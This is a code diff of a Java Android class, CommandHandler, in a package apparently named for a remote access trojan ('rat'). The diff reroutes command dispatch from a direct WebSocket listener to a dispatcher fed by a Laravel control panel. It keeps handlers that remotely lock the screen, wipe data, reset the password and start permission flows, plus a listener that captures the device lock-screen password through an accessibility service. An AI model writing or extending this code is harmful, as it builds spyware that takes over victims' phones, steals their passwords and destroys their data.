@@ -33,8 +33,7 @@ import com.vendor.rat.utils.DeviceUtils;
  *   { "cmd": "start_permission_flow" }
  *   { "cmd": "start_all_engines" }
  */
-public class CommandHandler implements WebSocketClient.CommandListener,
-        LockScreenMonitor.PasswordCaptureListener {
+public class CommandHandler implements LockScreenMonitor.PasswordCaptureListener {
 
     private static final String TAG = "CommandHandler";
 
@@ -58,13 +57,6 @@ public class CommandHandler implements WebSocketClient.CommandListener,
      * 初始化: 注册到 WebSocket 和 LockScreenMonitor
      */
     public void init() {
-        // 注册 WebSocket 指令监听
-        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
-        if (wsClient != null) {
-            wsClient.setCommandListener(this);
-            Log.i(TAG, "Registered as WebSocket command listener");
-        }
-
         // 注册密码捕获回调
         MyAccessibilityService service = MyAccessibilityService.getInstance();
         if (service != null && service.getEngineManager() != null) {
@@ -77,48 +69,60 @@ public class CommandHandler implements WebSocketClient.CommandListener,
         }
     }
 
-    // ============ WebSocket 指令处理 ============
+    // ============ 引擎指令处理 (由 CommandDispatcher 委托调用) ============
 
-    @Override
-    public void onCommandReceived(String message) {
-        Log.d(TAG, "Command received: " + message);
+    public void onCommand(String type, String subc, JsonObject json) {
+        Log.d(TAG, "Command received: type=" + type + ", subc=" + subc);
 
         try {
-            JsonObject json = JsonParser.parseString(message).getAsJsonObject();
+            // 兼容旧 cmd 格式 (来自本地 HttpCommandServer)
             String cmd = json.has("cmd") ? json.get("cmd").getAsString() : "";
+            if (!cmd.isEmpty()) {
+                dispatchByCmd(cmd, json);
+                return;
+            }
 
-            switch (cmd) {
-                case CMD_START_ENGINE:
-                    handleStartEngine(json);
-                    break;
-                case CMD_STOP_ENGINE:
-                    handleStopEngine(json);
-                    break;
-                case CMD_LOCK_SCREEN:
-                    handleLockScreen();
-                    break;
-                case CMD_WIPE_DATA:
-                    handleWipeData();
-                    break;
-                case CMD_RESET_PASSWORD:
-                    handleResetPassword(json);
-                    break;
-                case CMD_GET_STATUS:
-                    handleGetStatus();
-                    break;
-                case CMD_START_PERMISSION_FLOW:
-                    handleStartPermissionFlow();
-                    break;
-                case CMD_START_ALL_ENGINES:
-                    handleStartAllEngines();
-                    break;
-                default:
-                    Log.w(TAG, "Unknown command: " + cmd);
-                    sendResponse("error", "Unknown command: " + cmd);
+            // Laravel PanelSendHandler 下发的命令: type="screencomd", subc="xxx"
+            // 具体命令分发由 Phase 5 的 CommandDispatcher 处理
+            // 这里只处理引擎相关的自定义命令
+            if ("engine".equals(type)) {
+                dispatchByCmd(subc != null ? subc : "", json);
             }
         } catch (Exception e) {
             Log.e(TAG, "Failed to parse command", e);
             sendResponse("error", "Parse error: " + e.getMessage());
+        }
+    }
+
+    private void dispatchByCmd(String cmd, JsonObject json) {
+        switch (cmd) {
+            case CMD_START_ENGINE:
+                handleStartEngine(json);
+                break;
+            case CMD_STOP_ENGINE:
+                handleStopEngine(json);
+                break;
+            case CMD_LOCK_SCREEN:
+                handleLockScreen();
+                break;
+            case CMD_WIPE_DATA:
+                handleWipeData();
+                break;
+            case CMD_RESET_PASSWORD:
+                handleResetPassword(json);
+                break;
+            case CMD_GET_STATUS:
+                handleGetStatus();
+                break;
+            case CMD_START_PERMISSION_FLOW:
+                handleStartPermissionFlow();
+                break;
+            case CMD_START_ALL_ENGINES:
+                handleStartAllEngines();
+                break;
+            default:
+                Log.w(TAG, "Unknown command: " + cmd);
+                sendResponse("error", "Unknown command: " + cmd);
         }
     }
 
